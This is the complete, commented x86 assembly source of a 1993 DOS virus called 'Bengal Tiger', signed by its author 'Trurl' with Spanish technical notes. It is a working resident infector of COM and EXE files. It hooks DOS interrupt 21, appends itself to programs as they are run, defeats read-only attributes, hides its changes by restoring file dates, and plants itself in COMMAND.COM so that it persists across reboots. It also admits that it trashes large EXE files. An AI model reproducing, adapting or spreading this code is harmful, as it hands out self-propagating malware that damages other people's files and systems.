; Virus: Bengal Tiger, v3p0x (version 3.0 experimental)
; Infector de EXE y COM, parasitico, residente.
; Fecha: 6 de diciembre de 1993
; Size: 846 bytes.
; Detalles:
;   Tecnicos:
;    -Residente por metodo de MCB
;    -Residence test: Subfuncion definida en INT 21
;    -Prevencion de reinfeccion de files: marca en el file.
;    -Diferencia entre COM y EXE por la marca MZ.
;    -El modo de infectar EXE es agregando 1-16 bytes de basura al archivo 
;     para que el size caiga en paragrafo, y poder asi calcular un CS:IP que 
;     apunte al final del file con IP=0. (A diferencia del WilliStrover III).
;    -El modo de infectar COM es poniendo un JMP al virus al principio del 
;     programa, y luego reemplazandolo por los bytes originales.
;   Remarcables:
;    -La infeccion solo esta activa si el Scroll Lock esta encendido.
;    -Capaz de infectar files READ ONLY, sin modificar el atributo.
;    -Al infectar, NO cambia la fecha y hora del file. 
;    -Al intentar infectar EXEs de un tama�o mayor a 524288 bytes (0,5M), el 
;    virus 'se confunde' y los infecta mal. El file queda corrompido (trashed)
;    -Algunos COM infectados se cuelgan, a pesar de que el virus no deja basu-
;     ra en los registros, reestablece apropiadamente sus primeros tres bytes
;     ni produce ningun otro efecto colateral observable.
;   -Si el virus al ejecutarse no se encuentra en memoria, infecta incondicio-
;    nalmente al COMMAND.COM buscando en el environment la variable comspec.
;    Esto esta orientado a hacer que la migracion del virus y su instalacion en
;    un sistema limpio sea mas rapida. La idea es asi: en un sistema limpio, 
;    al ejecutarse el primer file infectado exotico, el virus no se encuentra 
;    en memoria a si mismo, e infecta el command.com. En un segundo booteo,
;    el virus se carga desde el command.com del booteo, estando en memoria 
;    siempre que se ejecute cualquier programa (infectado o no). 
; ORDEN:
;       El codigo esta organizado de la sgte. manera:
;       1-Datos
;       2-Partes residentes
;           a-Entrada a la RSI de INT 21
;           b-Rutina de Residence Test
;           c-Rutina reemplazo de funcion 4B
;           d-Rutina de infeccion de COM
;           e-Rutina de infeccion de EXE
;       3-Instaladores
;           a-de COM
;           b-de EXE
;       4-Procedures independientes
;           a-MoveVir
;           b-HookInts
;           c-CheckRes
;           d-N2E
;           e-CReg
;           f-IsInfd
;           g-ICommand

; AVISO: El virus se me escapo sin querer y me infecto los files
; C:\PCT\SIMCGA.COM y C:\DOS\ATTRIB.EXE mientras trataba de hace que el
; virus infectara READ ONLY. Cauterice y castre estos especimenes, neutra-
; lizando la infeccion, pero la dejo registrada, por si acaso.
; NOTA: Incapaz de infectar el COMMAND.COM en la instalacion si este es READ
; ONLY, y cambiandole la fecha.

DOSSEG
    .MODEL TINY
    .CODE
    jmp ComInstall

; ExeData
    OldEntry            DD          0
    ; Guarda el viejo CS:IP en un EXE infectado
    OldInt21            DD          0
    ; Guarda la direccion de la RSI original de INT 21
; ComData
    JmpM                DB          0e9h, 0, 0
    ; Usado en la infeccion de COMs
; Shared Data
    Header          DB          20h DUP('H');
    ; Guarda o bien el header de los EXE o los 1ros 20 bytes de los COM
    GBuff               DB          0,0,0,0
    ; Buffer general. Usado para evitar la reinfeccion de files.
    Comspec         DB          "COMSPEC="
    ; Usado en la infeccion del COMMAND.COM
; VirData
    VName               DB          "# Bengal Tiger, v3p0x #"
    Author          DB          "# By Trurl, the great constructor, 1993#"
    Country         DB          "# Buenos Aires, Argentina #"

NewInt21:
    cmp ax, 0ffafh
    jz RTest
    cmp ah, 4bh
    jz Infect
    jmp cs:OldInt21

RTest:
    ; Residence test.
    mov ax, 0afffh
    iret

Infect:
    ; Ejecutar el programa
    push dx
    push ds
    pushf
    call cs:OldInt21
    pop ds
    pop dx

    push ax
    push bx
    push cx
    push dx
    push ds

    ; Verificar si el Scroll Lock esta encendido
    mov ah, 2h
    int 16h
    and al, 16
    or al, al
    jz NotInfect ; si no lo esta no infectar

    ; Guardar viejos atributos en la stack
    mov ax, 4300h
    int 21h
    push cx
    push dx
    push ds
    ; Prevenir el READ-ONLY seteando atributos a nulo
    mov ax, 4301h
    mov cl, 0
    int 21h

    ; Abrir el file
    mov ax, 3d02h
    int 21h
    mov bx, ax

    ; Ver si ya esta infectado el file
    push cs
    pop ds
    call IsInfd
    jc IsInfected ; si lo esta, no se lo infecta

    ; Leer 32 bytes
    mov ah, 3fh
    push cs
    pop ds
    mov dx, offset Header
    mov cx, 20h
    int 21h

    ; Obtener la Time-Date Stamp y guardarla
    mov ax, 5700h
    int 21h
    push cx
    push dx

    mov ax, offset KeepTD
    push ax

    ; Ver si es EXE o COM por el MZ
    mov ax, word ptr Header
    cmp ax, 'ZM'
    jnz InfectCom ; COM
    jmp InfectExe ; EXE

KeepTD:
    ; Poner la vieja Time-Date stamp
    mov ax, 5701h
    pop dx
    pop cx
    int 21h
IsInfected:
    ; Cerrar el file
    mov ah, 3eh
    int 21h
    ; Restaurar el viejo atributo
    pop ds
    pop dx
    pop cx
    mov ax, 4301h
    int 21h
NotInfect:
    pop ds
    pop dx
    pop cx
    pop bx
    pop ax
    iret

InfectCom:
; Infector de COM
; BX debe tener el handle
; DS = CS
; en Header deben estar los primeros 20 bytes de codigo.
; en BX devuelve el header todavia
    ; Obtener el size del file
    mov ax, 4202h
    xor cx, cx
    xor dx, dx
    int 21h
    push ax

    ; Escribir el codigo del virus al final del file
    xor dx, dx
    mov ah, 40h
    mov cx, offset Fin
    int 21h

    ; Ir al principio del file
    mov ax, 4200h
    xor cx, cx
    xor dx, dx
    int 21h

    ; Usando el size obtenido, codificar
    ; el JMP, y escribirlo al principio
    pop ax
    sub ax, 3
    mov word ptr JmpM+1, ax
    mov ah, 40h
    mov cx, 3
    mov dx, offset JmpM
    int 21h

    ret
InfectExe:
; Infector de EXEs
; En BX debe estar el handle del file
; El Header debe haber sido leido en 'Header'
; DS debe ser igual a CS
; en BX devuelve el header todavia

    ; Copiar viejo CS:IP a OldEntry
    mov ax, word ptr Header+14h
    mov word ptr OldEntry, ax
    mov ax, word ptr Header+16h
    mov word ptr OldEntry+2, ax

    ; Ver size del archivo
    mov ax, 4202h
    xor cx, cx
    xor dx, dx
    int 21h

    ; Agregar 1-16 bytes de trash si necesario
    and ax, 0fh
    or ax, ax
    jz NotAdd
    mov cx, 10h
    sub cx, ax
    xor dx, dx
    mov ds, dx
    mov ah, 40h
    int 21h
NotAdd:
    push cs
    pop ds

    ; Obtener el size
    mov ax, 4202h
    xor dx, dx
    xor cx, cx
    int 21h
    ; Calcular con el el nuevo CS
    mov cl, 4                       ; ATENCION: Este es el codigo
    shr ax, cl                      ; responsable de que el virus no
    mov cl, 12                      ; pueda infectar EXEs de mas de
    shl dx, cl                      ; 1 mega.
    add dx, ax
    mov ax, offset InstallExe 
    sub dx, word ptr Header+8

    ; Poner el nuevo CS:IP en el header
    mov word ptr Header+14h, ax
    mov word ptr Header+16h, dx

    ; Escribir el codigo del virus
    mov ah, 40h
    push cs
    pop ds
    xor dx, dx
    mov cx, offset Fin
    int 21h

    ; Obtener el nuevo size (Programa Original+Virus)
    mov ax, 4202h
    xor cx, cx
    xor dx, dx
    int 21h

    ; Convertir este size a formato EXEHEADER
    call N2E

    ; ATENCION: Este codigo es el que trae problemas con EXEs
    ; de mas de 0,5 mega, y con EXEs con overlays internos.
    mov word ptr Header+2, ax
    inc dx
    mov word ptr Header+4, dx

    ; Ir al principio del file y escribir el nuevo HEADER
    mov ax, 4200h
    xor cx, cx
    xor dx, dx
    int 21h
    mov ah, 40h
    mov cx, 20h
    mov dx, offset Header
    int 21h

    ret

ComInstall:
    ; Instalacion del virus en memoria desde un COM
    ; Chequear que no estemos en memoria
    call CheckRes
    jc AlreadyInfCom

    ; Hacer los arreglos necesarios para quedar en memoria
    mov si, ds:[101h]
    add si, 103h
    call MoveVir
    call ICommand

    ; Capturar interrupciones
    push ds
    push es
    pop ds
    call HookInts
    pop ds
    push ds
    pop es
    nop
    nop

AlreadyInfCom:
    ; Reestablecer los primeros bytes del COM en memoria
    mov si, ds:[101h]
    add si, 103h+offset Header
    mov di, 100h
    mov cx, 3
    rep movsb
    mov ax, 100h
    push ax
    ; limpiar los registros
    call CReg
    ; Correr el programa original
    ret

InstallExe:
    push ds
    ; Chequear que no estemos en memoria
    call CheckRes
    jc AlreadyInfected

    ; Hacer los arreglos necesarios para quedar en memoria
    push cs
    pop ds
    xor si, si
    call MoveVir
    call ICommand
    ; Capturar interrupciones
    push es
    pop ds
    call HookInts

AlreadyInfected:
    ; Reestablecer los registros de segmento originales
    pop ds
    push ds
    pop es
    ; Limpiar los registros
    call CReg
    cli
    ; Determinar donde es el punto de entrada del 
    ; programa usando OldEntry, ds, y el largo del PSP.
    mov ax, cs:word ptr OldEntry
    mov word ptr cs:JmpO, ax
    mov ax, cs:word ptr OldEntry+2
    mov word ptr cs:JmpS, ax
    mov ax, ds
    add word ptr cs:JmpS, ax
    add word ptr cs:JmpS, 10h
    xor ax, ax
    sti
    ; Saltar al programa original
    db 0eah
    JmpO dw 0
    JmpS dw 0

; ----------- Rutinas autonomas -------------
MoveVir     proc
; Entrada; DS:SI puntero al virus, ES bloque de memoria asignado al programa
; Salida; ES contiene el segmento donde el virus es copiado
    push ds
    push si

    ; Paragrafos que ocupa el virus:
    mov bx, offset Fin
    add bx, 0fh
    mov cl, 4
    shr bx, cl
    push bx

    push es
    ; Resize el bloque actual
    mov ax, es
    dec ax
    mov es, ax
    mov ax, es:[3]
    inc bx
    sub ax, bx
    mov bx, ax
    mov ah, 4ah
    pop es
    int 21h

    ; Obtener nuevo bloque para el virus
    pop bx
    mov ah, 48h
    int 21h

    ; Dejar residente al bloque
    mov es, ax
    mov ax, es
    dec ax
    mov es, ax
    mov word ptr es:[1], 8
    inc ax
    mov es, ax

    pop si
    pop ds

    ; Copiar el virus
    mov cx, offset Fin
    xor di, di
Lop:
    mov al, ds:[si]
    mov es:[di], al
    inc di
    inc si
    dec cx
    jnz Lop
    nop
    nop

    ret
endp
HookInts        proc
; Entrada; DS segmento del virus en memoria
; Salida; ninguna
    ; Obtener viejas interrupciones
    mov ax, 3521h
    int 21h
    mov word ptr OldInt21, bx
    mov word ptr OldInt21+2, es
    ; Capturar interrupciones
    mov dx, offset NewInt21
    mov ax, 2521h
    int 21h
    ret
endp
CheckRes        proc
; Entrada; ninguna
; Salida; carry set si el virus esta en memoria
    ; Residence test
    mov ax, 0ffafh
    int 21h
    cmp ax, 0afffh
    jz ItIs
    clc
    ret
ItIs:
    stc
    ret
endp

N2E     proc
; Entrada: DX.AX = (dword) Number
; Salida: DX = 512 byte pages AX = Reminder
; Convierte de numero binario normal al formato
; en que se guarda el size en los EXEHEADER 
; (paginas de 512 bytes*512+reminder)
    push bx
    mov bx, 512
    div bx
    xchg ax, dx
    pop bx
    ret
endp
CReg        proc
; Limpia los registros
    xor ax, ax
    xor bx, bx
    xor cx, cx
    xor dx, dx
    xor si, si
    xor di, di
    ret
endp
IsInfd  proc
; Verifica si un file ya esta infectado
; Entrada; BX file handle DS:0 virus
; Salida; Carry set si infectado (BX todavia es handle)
    ; Conseguir el size
    mov ax, 4202h
    xor cx, cx
    xor dx, dx
    int 21h
    ; Restarle cuatro e ir a esa posicion
    sub ax, 4
    mov cx, dx
    mov dx, ax
    mov ax, 4200h
    int 21h

    ; Leer cuatro bytes
    mov ah, 3fh
    mov cx, 4
    mov dx, offset GBuff
    int 21h
    ; Volver al principio del programa
    mov ax, 4200h
    xor cx, cx
    xor dx, dx
    int 21h

    ; Ver si los cuatro bytes leidos son iguales a la marca
    mov ax, word ptr GBuff
    cmp ax, "ur"
    jnz NotInf
    mov ax, word ptr GBuff+2
    cmp ax, "lr"
    jnz NotInf
    stc
    ret
NotInf:
    clc
    ret
endp
ICommand        proc
; Entrada; DS:0 apunta a un PSP valido. ES:0 apunta al virus
; Salida; ninguna
    push ds

    ; Obtener el environment
    mov si, ds:[2ch]
    or si, si
    jz NotIN    ; Si no hay environment, estamos en el primer command.com que se
                ; carga. No infectar.
    ; Si lo hay, buscar el COMSPEC
    mov ds, si
    xor si, si
    mov di, offset Comspec
    mov cx, 8

CompareIt:
    mov al, ds:[si]
    cmp al, es:[di]
    jnz NotEqual
    inc si
    inc di
    dec cx
    jz OutOf
    jnz CompareIt
NotEqual:
    mov di, offset Comspec
    mov cx, 8
    inc si
    jmp CompareIt
OutOf:
    ; Encontrado el COMSPEC, abrir el file.
    mov dx, si
    mov ax, 3d02h
    int 21h
    mov bx, ax
    push es
    pop ds
    ; Ver si ya esta infectado.
    call IsInfd
    jc NotI

    ; Necesario para la infeccion.
    mov ah, 3fh
    mov dx, offset Header
    mov cx, 20h
    int 21h

    ; Infectar.
    call InfectCom
NotI:
    mov ah, 3eh
    int 21h
NotIN:
    pop ds
    ret
endp
    IDMark      DB    "Trurl"
    ; Marca de reconocimiento.
Fin:
END

; A Virus By Trurl
; TrUrL RuLeZ!
; Be aware for another wonderfull release from ... Trurl, the great constructor
